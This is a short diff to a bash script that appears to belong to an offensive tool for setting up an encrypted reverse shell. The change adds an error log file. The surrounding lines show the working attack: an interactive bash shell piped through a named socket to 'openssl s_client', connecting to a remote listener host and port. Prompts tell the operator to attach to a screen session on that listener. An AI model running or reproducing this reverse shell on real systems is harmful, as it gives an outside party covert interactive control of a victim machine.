@@ -66,5 +66,7 @@ fi
 
 echo -e "${BYELLOW}Connect to the screen ${BGREEN}listener_$cname${BYELLOW} on your listener host ($rhost)${NOCOLOR}"
 echo -e "${BYELLOW}Warning: Pressing CTRL+C will exit that shell in the screen session.${NOCOLOR}"
+#Initiate our errorfile
+touch $installdir/$cname/err_$cname.log
 #The Dresden Shuffle with bash. This is where we actually redirect the shell via a socket.
 /bin/bash -i < $installdir/reversesocket_$cname 2>&1 | openssl s_client -quiet -connect $rhost:$rport > $installdir/reversesocket_$cname 2> $installdir/$cname/err_$cname.log
